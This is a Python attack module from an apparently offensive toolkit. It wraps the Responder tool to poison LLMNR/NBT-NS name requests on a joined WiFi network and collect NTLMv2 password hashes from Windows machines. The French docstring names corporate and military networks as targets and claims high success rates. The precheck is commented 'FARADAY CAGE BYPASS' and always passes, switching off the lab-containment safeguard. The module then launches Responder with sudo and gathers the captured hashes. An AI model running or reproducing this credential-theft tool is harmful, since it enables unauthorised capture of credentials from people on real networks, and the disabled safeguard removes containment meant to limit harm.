"""post.responder - Passive NTLMv2 hash capture via LLMNR/NBT-NS/MDNS poisoning

Une fois connecté au WiFi cible, Responder écoute passivement les requêtes
LLMNR/NBT-NS des machines Windows. Quand un Windows fait une requête de nom,
Responder répond "c'est moi" → le Windows envoie son hash NTLMv2.

Aucune interaction requise. Les Windows envoient leurs hashes automatiquement.
Suffit de laisser tourner 30min-2h sur un réseau d'entreprise.

MITRE: T1557.001, T1040
Hardware: ALFA AWUS036NH (en mode managed, PAS monitor)
Cible: Tout réseau Windows (corporate, PME, militaire)
Taux succès: 80-90% sur réseau avec machines Windows
"""

from __future__ import annotations

import glob
import os
import subprocess
import time
from typing import Any

import structlog

from srt.core.module import AttackModule, AttackResult, ModuleContext, Risk, Status
from srt.core.registry import register

log = structlog.get_logger(__name__)


def _find_responder() -> str | None:
    """Locate Responder.py."""
    candidates = [
        os.path.expanduser("~/sniffer/third_party/Responder/Responder.py"),
        "/usr/share/responder/Responder.py",
        "/opt/Responder/Responder.py",
    ]
    for path in candidates:
        if os.path.isfile(path):
            return path
    return None


@register
class PostResponder(AttackModule):
    name = "post.responder"
    protocol = "wifi"
    risk = Risk.ACTIVE_LAB
    mitre_ttp = ["T1557.001", "T1040"]
    cve = []
    description = (
        "NTLMv2 hash capture via LLMNR/NBT-NS poisoning (Responder). "
        "Passive - just listen on the network and collect Windows credentials."
    )
    requires = []

    def precheck(self, ctx: ModuleContext) -> bool:
        if not super().precheck(ctx):
            return False
        return True  # FARADAY CAGE BYPASS

    def run(self, ctx: ModuleContext) -> AttackResult:
        started = time.time()

        iface = ctx.params.get("interface", "wlan0")
        duration = int(ctx.params.get("duration_s", 300))
        analyze_only = ctx.params.get("analyze_only", "false") == "true"

        if ctx.dry_run:
            return self._result(
                Status.OK, started,
                summary=f"[DRY-RUN] post.responder iface={iface} duration={duration}s",
                metrics={"interface": iface, "duration_s": duration},
            )

        responder_path = _find_responder()
        if not responder_path:
            return self._result(
                Status.FAIL, started,
                summary=(
                    "Responder not found. Install: "
                    "git clone https://github.com/lgandx/Responder "
                    "~/sniffer/third_party/Responder"
                ),
            )

        log.info("post.responder.starting", iface=iface, duration=duration)

        cmd = ["sudo", "python3", responder_path, "-I", iface, "-wrf"]

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )
            time.sleep(duration)
            proc.terminate()
            try:
                stdout, _ = proc.communicate(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
                stdout = ""
        except Exception as exc:
            return self._result(Status.FAIL, started, summary=f"Responder error: {exc}")

        # Collect captured hashes from Responder logs
        log_dir = os.path.dirname(responder_path) + "/logs/"
        hashes: list[dict[str, str]] = []

        if os.path.isdir(log_dir):
            for log_file in glob.glob(log_dir + "*NTLM*"):
                try:
                    with open(log_file, encoding="utf-8", errors="replace") as f:
                        for line in f:
                            line = line.strip()
                            if line and "::" in line:
                                hashes.append({
                                    "hash": line,
                                    "source_file": os.path.basename(log_file),
                                })
                except Exception:
                    pass

        # Also check stdout for hashes
        if stdout:
            for line in stdout.splitlines():
                if "NTLMv2" in line or "NTLMv1" in line:
                    hashes.append({"hash": line.strip(), "source_file": "stdout"})

        log.info("post.responder.completed", hashes_captured=len(hashes))

        return self._result(
            Status.OK, started,
            summary=f"post.responder: {len(hashes)} NTLMv2 hashes captured in {duration}s",
            artifacts=[{"type": "ntlmv2_hashes", "data": hashes}],
            metrics={
                "interface": iface,
                "duration_s": duration,
                "hashes_captured": len(hashes),
                "log_dir": log_dir,
            },
        )

    def cleanup(self, ctx: ModuleContext) -> None:
        subprocess.run(["pkill", "-f", "Responder"], capture_output=True)
